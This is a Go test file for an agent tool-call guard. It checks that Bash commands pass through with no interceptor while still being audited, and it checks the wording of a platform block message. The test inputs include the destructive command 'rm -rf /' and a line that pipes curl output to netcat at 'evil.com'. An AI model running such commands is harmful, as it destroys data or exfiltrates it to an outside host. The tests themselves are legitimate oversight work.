package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// 플랫폼과 대상의 구분·금지 의미를 유지하며 모델용 문구만 영어로 바꾼다.
func TestSystemBlockMessageUsesEnglishPlatformFraming(t *testing.T) {
	for _, tc := range []struct {
		name   string
		reason string
	}{
		{"unpunctuated", "synthetic reason"},
		{"punctuated", "synthetic reason."},
		{"multiline", "synthetic first line\nsecond line"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := systemBlockMessage(tc.reason)
			want := "[ARTEX PLATFORM CONTROL - NOT TARGET DEFENSE] This call was blocked by the platform. Reason: " + tc.reason + "\nThis operation is prohibited."
			if got != want {
				t.Errorf("systemBlockMessage = %q, want %q", got, want)
			}
		})
	}
}

var _ = hook.PreToolUse
